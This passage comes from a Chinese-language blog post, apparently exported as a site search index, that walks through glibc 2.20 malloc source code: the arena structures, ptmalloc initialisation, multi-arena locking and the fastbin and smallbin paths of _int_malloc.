*/#define NONCONTIGUOUS_BIT (2U)#define contiguous(M) (((M)-\u003eflags \u0026 NONCONTIGUOUS_BIT) == 0)#define noncontiguous(M) (((M)-\u003eflags \u0026 NONCONTIGUOUS_BIT) != 0)#define set_noncontiguous(M) ((M)-\u003eflags |= NONCONTIGUOUS_BIT)#define set_contiguous(M) ((M)-\u003eflags \u0026= ~NONCONTIGUOUS_BIT) max_fast中的最后两位用作控制信息，bit0用来表示fast bins是否为空。如果bit0为0，表示分配区中有fast chunk，如果为1表示没有fast chunk，初始化完成后的malloc_state实例中，flags值为0，表示该分配区中有fast chunk，但实际上没有，试图从fast bins中分配chunk都会返回NULL，在第一次调用函数malloc_consolidate()对fast bins进行chunk合并时，如果max_fast大于0，会调用clear_fastchunks宏，标志该分配区中已经没有fast chunk，因为函数malloc_consolidate()会合并所有的fast bins中的chunk。clear_fastchunks宏只会在函数malloc_consolidate()中调用。当有fast chunk加入fast bins时，就是调用set_fastchunks宏标识分配区的fast bins中存在fast chunk。 Flags的bit1如果为0，表示MORCORE返回连续虚拟地址空间，bit1为1，表示MORCORE返回非连续虚拟地址空间，对于主分配区，MORECORE其实为sbr()，默认返回连续虚拟地址空间，对于非主分配区，使用mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为，而默认情况下mmap映射区域是不保证虚拟地址空间连续的，所以非主分配区默认分配非连续虚拟地址空间。 fastbinsY是有十个元素的数组，存放了fastbin的链表头。 top指向了该分配区的top chunk。 last_remainder是一个chunk指针，分配区上次分配small chunk时，从一个chunk中分裂出一个small chunk返回给用户，分裂后的剩余部分形成一个chunk，last_remainder就是指向的这个chunk。 bins是当前分配区存储unstored bin，small bins和large bins的chunk链表头的数组。 注意：计算出来数组有254个元素，之前bin头被描述为一个malloc chunk但是要链接chunk，我们只需要fd和bk，对于large bin来说只需要fd_nextsize和bk_nextsize，所以只要为指针申请空间即可，其余域都是被复用的 binmap字段是一个int数组，共128位。ptmalloc用一个bit来标识该bit对应的bin中是否包含空闲chunk。 next字段用于将分配区以单向链表链接起来。 next_free字段空闲的分配区链接在单向链表中，只有在定义了PER_THREAD的情况下才定义该字段。 system_mem字段记录了当前分配区已经分配的内存大小。 max_system_mem记录了当前分配区最大能分配的内存大小。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#malloc_state"},{"categories":["Pwning"],"content":"malloc_par struct malloc_par{ /* Tunable parameters */ unsigned long trim_threshold; INTERNAL_SIZE_T top_pad; INTERNAL_SIZE_T mmap_threshold; INTERNAL_SIZE_T arena_test; INTERNAL_SIZE_T arena_max; /* Memory map support */ int n_mmaps; int n_mmaps_max; int max_n_mmaps; /* the mmap_threshold is dynamic, until the user sets it manually, at which point we need to disable any dynamic behavior. */ int no_dyn_threshold; /* Statistics */ INTERNAL_SIZE_T mmapped_mem; /*INTERNAL_SIZE_T sbrked_mem;*/ /*INTERNAL_SIZE_T max_sbrked_mem;*/ INTERNAL_SIZE_T max_mmapped_mem; INTERNAL_SIZE_T max_total_mem; /* only kept for NO_THREADS */ /* First address handed out by MORECORE/sbrk. */ char *sbrk_base;}; malloc_par记录了一些参数和统计信息，trim_threshold字段表示收缩阈值，默认为128KB，当每个分配区的top chunk大小大于这个阈值时，在一定的条件下，调用free时会收缩内存，减小top chunk的大小。由于mmap分配阈值的动态调整，在free时可能将收缩阈值修改为mmap分配阈值的2倍，在64位系统上，mmap分配阈值最大值为32MB，所以收缩阈值的最大值为64MB，在32位系统上，mmap分配阈值最大值为512KB，所以收缩阈值的最大值为1MB。收缩阈值可以通过函数mallopt()进行设置。 top_pad：表示在分配内存时是否添加额外的pad，默认该字段为0。 mmap_threshold：表示mmap分配阈值，默认值为128KB，在32位系统上最大值为512KB，64位系统上的最大值为32MB，由于默认开启mmap分配阈值动态调整，该字段的值会动态修改，但不会超过最大值。 arena_test和arena_max用于PER_THREAD优化，在32位系统上arena_test默认值为2，64位系统上的默认值为8，当每个进程的分配区数量小于等于arena_test时，不会重用已有的分配区。为了限制分配区的总数，用arena_max来保存分配区的最大数量，当系统中的分配区数量达到arena_max，就不会再创建新的分配区，只会重用已有的分配区。这两个字段都可以使用mallopt()函数设置。 n_mmaps：表示当前进程使用mmap()函数分配的内存块的个数。 n_mmaps_max：表示进程使用mmap()函数分配的内存块的最大数量，默认值为65536，可以使用mallopt()函数修改。 max_n_mmaps：表示当前进程使用mmap()函数分配的内存块的数量的最大值，有关系n_mmaps \u003c= max_n_mmaps成立。这个字段是由于mstats()函数输出统计需要这个字段。 no_dyn_threshold：表示是否开启mmap分配阈值动态调整机制，默认值为0，也就是默认开启mmap分配阈值动态调整机制。 pagesize：表示系统的页大小，默认为4KB。 mmapped_mem和max_mmapped_mem都用于统计mmap分配的内存大小，一般情况下两个字段的值相等，max_mmapped_mem用于mstats()函数。 max_total_mem：在单线程情况下用于统计进程分配的内存总数。 sbrk_base：表示堆的起始地址。 /* There are several instances of this struct (\"arenas\") in this malloc. If you are adapting this malloc in a way that does NOT use a static or mmapped malloc_state, you MUST explicitly zero-fill it before using. This malloc relies on the property that malloc_state is initialized to all zeroes (as is true of C statics). */static struct malloc_state main_arena ={ .mutex = MUTEX_INITIALIZER, .next = \u0026main_arena};/* There is only one instance of the malloc parameters. */static struct malloc_par mp_ ={ .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, .trim_threshold = DEFAULT_TRIM_THRESHOLD,#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES (1)};/* Non public mallopt parameters. */#define M_ARENA_TEST -7#define M_ARENA_MAX -8/* Maximum size of memory handled in fastbins. */static INTERNAL_SIZE_T global_max_fast; main_arena表示主分配区，任何进程有且仅有一个全局的主分配区，mp_是全局唯一的一个malloc_par实例，用于管理参数和统计信息，global_max_fast全局变量表示fast bins中最大的chunk大小。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:2","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#malloc_par"},{"categories":["Pwning"],"content":"malloc_init_state /* Initialize a malloc_state struct. This is called only from within malloc_consolidate, which needs be called in the same contexts anyway. It is never called directly outside of malloc_consolidate because some optimizing compilers try to inline it at all call points, which turns out not to be an optimization at all. (Inlining it in malloc_consolidate is fine though.) */static voidmalloc_init_state (mstate av){ int i; mbinptr bin; /* Establish circular links for normal bins */ for (i = 1; i \u003c NBINS; ++i) { bin = bin_at (av, i); bin-\u003efd = bin-\u003ebk = bin; }#if MORECORE_CONTIGUOUS if (av != \u0026main_arena)#endif set_noncontiguous (av); if (av == \u0026main_arena) set_max_fast (DEFAULT_MXFAST); av-\u003eflags |= FASTCHUNKS_BIT; av-\u003etop = initial_top (av);} malloc_init_state将分配区中的bin链表头都指向自身。在初始化主分配区时，av默认为0，即默认分配连续的空间(也仅有主分配区才能这样做)，对于非主分配区，需要设置分配非连续的空间。如果初始化的是主分配区，需要设置fast bins中最大chunk大小，由于主分配区只有一个，并且一定是最先初始化，这就保证了对全局变量global_max_fast只初始化了一次，只要该全局变量的值非0，也就意味着主分配区初始化了。最后初始化top chunk。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:3","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#malloc_init_state"},{"categories":["Pwning"],"content":"__libc_mallopt() int__libc_mallopt (int param_number, int value){ mstate av = \u0026main_arena; int res = 1; if (__malloc_initialized \u003c 0) ptmalloc_init (); (void) mutex_lock (\u0026av-\u003emutex); /* Ensure initialization/consolidation */ malloc_consolidate (av); LIBC_PROBE (memory_mallopt, 2, param_number, value); switch (param_number) { case M_MXFAST: if (value \u003e= 0 \u0026\u0026 value \u003c= MAX_FAST_SIZE) { LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ()); set_max_fast (value); } else res = 0; break; case M_TRIM_THRESHOLD: LIBC_PROBE (memory_mallopt_trim_threshold, 3, value, mp_.trim_threshold, mp_.no_dyn_threshold); mp_.trim_threshold = value; mp_.no_dyn_threshold = 1; break; case M_TOP_PAD: LIBC_PROBE (memory_mallopt_top_pad, 3, value, mp_.top_pad, mp_.no_dyn_threshold); mp_.top_pad = value; mp_.no_dyn_threshold = 1; break; case M_MMAP_THRESHOLD: /* Forbid setting the threshold too high. */ if ((unsigned long) value \u003e HEAP_MAX_SIZE / 2) res = 0; else { LIBC_PROBE (memory_mallopt_mmap_threshold, 3, value, mp_.mmap_threshold, mp_.no_dyn_threshold); mp_.mmap_threshold = value; mp_.no_dyn_threshold = 1; } break; case M_MMAP_MAX: LIBC_PROBE (memory_mallopt_mmap_max, 3, value, mp_.n_mmaps_max, mp_.no_dyn_threshold); mp_.n_mmaps_max = value; mp_.no_dyn_threshold = 1; break; case M_CHECK_ACTION: LIBC_PROBE (memory_mallopt_check_action, 2, value, check_action); check_action = value; break; case M_PERTURB: LIBC_PROBE (memory_mallopt_perturb, 2, value, perturb_byte); perturb_byte = value; break; case M_ARENA_TEST: if (value \u003e 0) { LIBC_PROBE (memory_mallopt_arena_test, 2, value, mp_.arena_test); mp_.arena_test = value; } break; case M_ARENA_MAX: if (value \u003e 0) { LIBC_PROBE (memory_mallopt_arena_max, 2, value, mp_.arena_max); mp_.arena_max = value; } break; } (void) mutex_unlock (\u0026av-\u003emutex); return res;}libc_hidden_def (__libc_mallopt) 在mallopt()函数配置前，需要检查主分配区是否初始化了，如果没有初始化，调用ptmalloc_init()函数初始化ptmalloc，然后获得主分配区的锁，调用malloc_consolidate()函数，malloc_consolidate()函数会判断主分配区是否已经初始化，如果没有，则初始化主分配区。同时我们也看到，mp_都没有锁，对mp_中参数字段的修改，是通过主分配区的锁来同步的。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:4","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#__libc_mallopt"},{"categories":["Pwning"],"content":"ptmalloc_init() static voidptmalloc_init (void){ if (__malloc_initialized \u003e= 0) return; __malloc_initialized = 0; ptmalloc_init()用于初始化ptmalloc，它首先检查全局变量__malloc_initialized是否大于等于0，如果该值大于0，表示ptmalloc已经初始化，如果该值为0，表示ptmalloc正在初始化，全局变量__malloc_initialized用来保证全局只初始化ptmalloc一次。 #ifdef SHARED /* In case this libc copy is in a non-default namespace, never use brk. Likewise if dlopened from statically linked program. */Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (ptmalloc_init, \u0026di, \u0026l, NULL) != 0 \u0026\u0026 l-\u003el_ns != LM_ID_BASE)) __morecore = __failing_morecore;#endif Ptmalloc需要保证只有主分配区才能使用sbrk()分配连续虚拟内存空间，如果有多个分配区使用sbrk()就不能获得连续的虚拟地址空间，大多数情况下Glibc库都是以动态链接库的形式加载的，处于默认命名空间，多个进程共用Glibc库，Glibc库代码段在内存中只有一份拷贝，数据段在每个用户进程都有一份拷贝。但如果Glibc库不在默认名字空间，或是用户程序是静态编译的并调用了dlopen函数加载Glibc库中的ptamalloc_init()，这种情况下的ptmalloc不允许使用sbrk()分配内存，只需修改__morecore函数指针指向__failing_morecore就可以禁止使用sbrk()了，__morecore默认指向sbrk()。 tsd_key_create (\u0026arena_key, NULL); tsd_setspecific (arena_key, (void *) \u0026main_arena); thread_atfork (ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2); const char *s = NULL; 初始化全局锁list_lock，list_lock主要用于同步分配区的单向循环链表。然后创建线程私有实例arena_key，该私有实例保存的是分配区（arena）的malloc_state实例指针。arena_key指向的可能是主分配区的指针，也可能是非主分配区的指针，这里将调用ptmalloc_init()的线程的arena_key绑定到主分配区上。意味着本线程首选从主分配区分配内存。 然后调用thread_atfork()设置当前进程在fork子线程（linux下线程是轻量级进程，使用类似fork进程的机制创建）时处理mutex的回调函数，在本进程fork子线程时，调用ptmalloc_lock_all()获得所有分配区的锁，禁止所有分配区分配内存，当子线程创建完毕，父进程调用ptmalloc_unlock_all()重新unlock每个分配区的锁mutex，子线程调用ptmalloc_unlock_all2()重新初始化每个分配区的锁mutex。 if (__glibc_likely (_environ != NULL)) { char **runp = _environ; char *envline; while (__builtin_expect ((envline = next_env_entry (\u0026runp)) != NULL, 0)) { size_t len = strcspn (envline, \"=\"); if (envline[len] != '=') /* This is a \"MALLOC_\" variable at the end of the string without a '=' character. Ignore it since otherwise we will access invalid memory below. */ continue; switch (len) { case 6: if (memcmp (envline, \"CHECK_\", 6) == 0) s = \u0026envline[7]; break; case 8: if (!__builtin_expect (__libc_enable_secure, 0)) { if (memcmp (envline, \"TOP_PAD_\", 8) == 0) __libc_mallopt (M_TOP_PAD, atoi (\u0026envline[9])); else if (memcmp (envline, \"PERTURB_\", 8) == 0) __libc_mallopt (M_PERTURB, atoi (\u0026envline[9])); } break; case 9: if (!__builtin_expect (__libc_enable_secure, 0)) { if (memcmp (envline, \"MMAP_MAX_\", 9) == 0) __libc_mallopt (M_MMAP_MAX, atoi (\u0026envline[10])); else if (memcmp (envline, \"ARENA_MAX\", 9) == 0) __libc_mallopt (M_ARENA_MAX, atoi (\u0026envline[10])); } break; case 10: if (!__builtin_expect (__libc_enable_secure, 0)) { if (memcmp (envline, \"ARENA_TEST\", 10) == 0) __libc_mallopt (M_ARENA_TEST, atoi (\u0026envline[11])); } break; case 15: if (!__builtin_expect (__libc_enable_secure, 0)) { if (memcmp (envline, \"TRIM_THRESHOLD_\", 15) == 0) __libc_mallopt (M_TRIM_THRESHOLD, atoi (\u0026envline[16])); else if (memcmp (envline, \"MMAP_THRESHOLD_\", 15) == 0) __libc_mallopt (M_MMAP_THRESHOLD, atoi (\u0026envline[16])); } break; default: break; } } } if (s \u0026\u0026 s[0]) { __libc_mallopt (M_CHECK_ACTION, (int) (s[0] - '0')); if (check_action != 0) __malloc_check_init (); } 从环境变量中读取相应的配置参数值，这些参数包括MALLOC_TRIM_THRESHOLD_，MALLOC_TOP_PAD_，MALLOC_PERTURB_，MALLOC_MMAP_THRESHOLD_，MALLOC_CHECK_，MALLOC_MMAP_MAX_，MALLOC_ARENA_MAX,MALLOC_ ARENA_TEST,如果这些选项中的某些项存在，调用mallopt()函数设置相应的选项。如果这段程序是在Glibc库初始化中执行的，会做更多的安全检查工作。 void (*hook) (void) = atomic_forced_read (__malloc_initialize_hook); if (hook != NULL) (*hook)(); __malloc_initialized = 1;} 在ptmalloc_init()函数结束处，查看是否存在__malloc_initialize_hook函数，如果存在，执行该hook函数。最后将全局变量__malloc_initialized设置为1，表示ptmalloc_init()已经初始化完成。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:5","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#ptmalloc_init"},{"categories":["Pwning"],"content":"多分配区由于只有一个主分配区从堆中分配小内存块，而稍大的内存块都必须从mmap映射区域分配，如果有多个线程都要分配小内存块，但多个线程是不能同时调用sbrk()函数的，因为只有一个函数调用sbrk()时才能保证分配的虚拟地址空间是连续的。如果多个线程都从主分配区中分配小内存块，效率很低效。为了解决这个问题，ptmalloc使用非主分配区来模拟主分配区的功能，非主分配区同样可以分配小内存块，并且可以创建多个非主分配区，从而在线程分配内存竞争比较激烈的情况下，可以创建更多的非主分配区来完成分配任务，减少分配区的锁竞争，提高分配效率。 Ptmalloc怎么用非主分配区来模拟主分配区的行为呢？首先创建一个新的非主分配区，非主分配区使用mmap()函数分配一大块内存来模拟堆（sub-heap），所有的从该非主分配区总分配的小内存块都从sub-heap中切分出来，如果一个sub-heap的内存用光了，或是sub-heap中的内存不够用时，使用mmap()分配一块新的内存块作为sub-heap，并将新的sub-heap链接在非主分配区中sub-heap的单向链表中。 分主分配区中的sub-heap所占用的内存不会无限的增长下去，同样会像主分配区那样进行sub-heap收缩，将sub-heap中top chunk的一部分返回给操作系统，如果top chunk为整个sub-heap，会把整个sub-heap还回给操作系统。收缩堆的条件是当前free的chunk大小加上前后能合并chunk的大小大于64KB，并且top chunk的大小达到mmap收缩阈值，才有可能收缩堆。 一般情况下，进程中有多个线程，也有多个分配区，线程的数据一般会比分配区数量多，所以必能保证没有线程独享一个分配区，每个分配区都有可能被多个线程使用，为了保证分配区的线程安全，对分配区的访问需要锁保护，当线程获得分配区的锁时，可以使用该分配区分配内存，并将该分配区的指针保存在线程的私有实例中。 当某一线程需要调用malloc分配内存空间时，该线程先查看线程私有变量中是否已经存在一个分配区，如果存在，尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，如果失败，该线程搜分配区索循环链表试图获得一个空闲的分配区。如果所有的分配区都已经加锁，那么malloc会开辟一个新的分配区，把该分配区加入到分配区的全局分配区循环链表并加锁，然后使用该分配区进行分配操作。在回收操作中，线程同样试图获得待回收块所在分配区的锁，如果该分配区正在被别的线程使用，则需要等待直到其他线程释放该分配区的互斥锁之后才可以进行回收操作。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#多分配区"},{"categories":["Pwning"],"content":"heap_info /* A heap is a single contiguous memory region holding (coalesceable) malloc_chunks. It is allocated with mmap() and always starts at an address aligned to HEAP_MAX_SIZE. */typedef struct _heap_info{ mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ \u0026 MALLOC_ALIGN_MASK];} heap_info; ar_ptr是指向所属分配区的指针; prev字段用于将同一个分配区中的sub_heap用单向链表链接起来。prev指向链表中的前一个sub_heap。 size字段表示当前sub_heap中的内存大小，以page对齐。 mprotect_size字段表示当前sub_heap中被读写保护的内存大小，也就是说还没有被分配的内存大小。 Pad字段用于保证sizeof (heap_info) + 2 * SIZE_SZ是按MALLOC_ALIGNMENT对齐的。MALLOC_ALIGNMENT_MASK为2 *SIZE_SZ - 1，无论SIZE_SZ为4或8，-6 * SIZE_SZ \u0026 MALLOC_ALIGN_MASK的值为0，如果sizeof (heap_info)+ 2 * SIZE_SZ不是按MALLOC_ALIGNMENT对齐，编译的时候就会报错，编译时会执行下面的宏。 /* Get a compile-time error if the heap_info padding is not correct to make alignment work as expected in sYSMALLOc. */extern int sanity_check_heap_info_alignment[(sizeof (heap_info) + 2 * SIZE_SZ) % MALLOC_ALIGNMENT ? -1 : 1]; 为什么一定要保证对齐呢？作为分主分配区的第一个sub_heap，heap_info存放在sub_heap的头部，紧跟heap_info之后是该非主分配区的malloc_state实例，紧跟malloc_state实例后，是sub_heap中的第一个chunk，但chunk的首地址必须按照MALLOC_ALIGNMENT对齐，所以在malloc_state实例和第一个chunk之间可能有几个字节的pad，但如果sub_heap不是非主分配区的第一个sub_heap，则紧跟heap_info后是第一个chunk，但sysmalloc()函数默认heap_info是按照MALLOC_ALIGNMENT对齐的，没有再做对齐的工作，直接将heap_info后的内存强制转换成一个chunk。所以这里在编译时保证sizeof (heap_info) + 2 * SIZE_SZ是按MALLOC_ALIGNMENT对齐的，在运行时就不用再做检查了，也不必再做对齐。 /* Thread specific data */static tsd_key_t arena_key;static mutex_t list_lock = MUTEX_INITIALIZER;static size_t narenas = 1;static mstate free_list;/* Mapped memory in non-main arenas (reliable only for NO_THREADS). */static unsigned long arena_mem;/* Already initialized? */int __malloc_initialized = -1; arena_key存放的是线程的私用实例，该私有实例保存的是分配区（arena）的malloc_state实例的指针。arena_key指向的可能是主分配区的指针，也可能是非主分配区的指针。 list_lock用于同步分配区的单向环形链表。 如果定义了PRE_THREAD，narenas全局变量表示当前分配区的数量，free_list全局变量是空闲分配区的单向链表，这些空闲的分配区可能是从父进程那里继承来的。全局变量narenas和free_list都用锁list_lock同步。 arena_mem只用于单线程的ptmalloc版本，记录了非主分配区所分配的内存大小。 __malloc_initializd全局变量用来标识是否ptmalloc已经初始化了，其值大于0时表示已经初始化。 /* arena_get() acquires an arena and locks the corresponding mutex. First, try the one last locked successfully by this thread. (This is the common case and handled with a macro for speed.) Then, loop once over the circularly linked list of arenas. If no arena is readily available, create a new one. In this latter case, `size' is just a hint as to how much memory will be required immediately in the new arena. */#define arena_get(ptr, size) do { \\ arena_lookup (ptr); \\ arena_lock (ptr, size); \\ } while (0)#define arena_lookup(ptr) do { \\ void *vptr = NULL; \\ ptr = (mstate) tsd_getspecific (arena_key, vptr); \\ } while (0)#define arena_lock(ptr, size) do { \\ if (ptr) \\ (void) mutex_lock (\u0026ptr-\u003emutex); \\ else \\ ptr = arena_get2 (ptr, (size), NULL); \\ } while (0) 上述用以获得一个分配区。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#heap_info"},{"categories":["Pwning"],"content":"公共包装","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#公共包装"},{"categories":["Pwning"],"content":"__libc_malloc /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t.*/void * __libc_malloc(size_t); __libc_malloc是malloc的真正调用的函数，这里是关于其功能的概述。 void *__libc_malloc (size_t bytes){ mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_lookup (ar_ptr); arena_lock (ar_ptr, bytes); if (!ar_ptr) return 0; victim = _int_malloc (ar_ptr, bytes); if (!victim) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); if (__builtin_expect (ar_ptr != NULL, 1)) { victim = _int_malloc (ar_ptr, bytes); (void) mutex_unlock (\u0026ar_ptr-\u003emutex); } } else (void) mutex_unlock (\u0026ar_ptr-\u003emutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;} 首先，检查__malloc_hook是否为空，是则向下执行，否则执行__malloc_hook指向的函数。这个功能是为了让使用者定义自己的malloc，其也存在于free、realloc等函数中。在进程初始化时__malloc_hook指向的函数为malloc_hook_ini()。 /* arena_get() acquires an arena and locks the corresponding mutex. First, try the one last locked successfully by this thread. (This is the common case and handled with a macro for speed.) Then, loop once over the circularly linked list of arenas. If no arena is readily available, create a new one. In this latter case, `size' is just a hint as to how much memory will be required immediately in the new arena. */#define arena_get(ptr, size) do { \\ arena_lookup (ptr); \\ arena_lock (ptr, size); \\ } while (0)#define arena_lookup(ptr) do { \\ void *vptr = NULL; \\ ptr = (mstate) tsd_getspecific (arena_key, vptr); \\ } while (0)#define arena_lock(ptr, size) do { \\ if (ptr) \\ (void) mutex_lock (\u0026ptr-\u003emutex); \\ else \\ ptr = arena_get2 (ptr, (size), NULL); \\ } while (0) 调用arena_lookup查找本线程的私用实例中是否包含一个分配区的指针，返回该指针，调用arena_lock尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，如果对该分配区加锁失败，调用arena_get2获得一个分配区指针。 之后调用了_int_malloc从分配区中获取内存。如果_int_malloc()函数分配内存失败，并且使用的分配区不是主分配区，这种情况可能是mmap区域的内存被用光了，当主分配区可以从堆中分配内存，所以需要再尝试从主分配区中分配内存。首先释放所使用分配区的锁，然后获得主分配区的锁，并调用_int_malloc()函数分配内存，最后释放主分配区的锁。 /* If we don't have the main arena, then maybe the failure is due to running out of mmapped areas, so we can try allocating on the main arena. Otherwise, it is likely that sbrk() has failed and there is still a chance to mmap(), so try one of the other arenas. */static mstatearena_get_retry (mstate ar_ptr, size_t bytes){ LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr); if (ar_ptr != \u0026main_arena) { (void) mutex_unlock (\u0026ar_ptr-\u003emutex); ar_ptr = \u0026main_arena; (void) mutex_lock (\u0026ar_ptr-\u003emutex); } else { /* Grab ar_ptr-\u003enext prior to releasing its lock. */ mstate prev = ar_ptr-\u003enext ? ar_ptr : 0; (void) mutex_unlock (\u0026ar_ptr-\u003emutex); ar_ptr = arena_get2 (prev, bytes, ar_ptr); } return ar_ptr;} 如果_int_malloc()函数分配内存失败，并且使用的分配区是主分配区，查看是否有非主分配区，如果有，调用arena_get2()获取分配区，然后对主分配区解锁，如果arena_get2()返回一个非主分配区，尝试调用_int_malloc()函数从该非主分配区分配内存，最后释放该非主分配区的锁。 如果_int_malloc()函数分配内存成功，释放所使用的分配区的锁。 可以发现真正分配内存的函数是_int_malloc()，而__libc_malloc()只是其简单的封装。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#__libc_malloc"},{"categories":["Pwning"],"content":"_int_malloc()下面重点分析_int_malloc()： /* ------------------------------ malloc ------------------------------ */static void *_int_malloc (mstate av, size_t bytes){ INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; 这里是定义的一些变量 /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size (bytes, nb); checked_request2size()将请求的大小转化为chunk的大小，在_int_malloc()内部分配内存是以chunk为单位的。 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if ((unsigned long) (nb) \u003c= (unsigned long) (get_max_fast ())) { idx = fastbin_index (nb); mfastbinptr *fb = \u0026fastbin (av, idx); mchunkptr pp = *fb; do { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-\u003efd, victim)) != victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } 如果chunk的大小在fast bins的范围内，首先尝试在fast bins中寻找适合的chunk。 首先根据所需chunk的大小获得该chunk所属fast bin的index，根据该index获得所需fast bin的空闲chunk链表的头指针，然后将头指针的下一个chunk作为空闲chunk链表的头部。为了加快从fast bins中分配chunk，处于fast bins中chunk的状态仍然保持为inuse状态，避免被相邻的空闲chunk合并，从fast bins中分配chunk，只需取出第一个chunk，并调用chunk2mem()函数返回用户所需的内存块。 /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) { idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) { if (victim == 0) /* initialization check */ malloc_consolidate (av); else { bck = victim-\u003ebk; if (__glibc_unlikely (bck-\u003efd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-\u003ebk = bck; bck-\u003efd = bin; if (av != \u0026main_arena) victim-\u003esize |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } 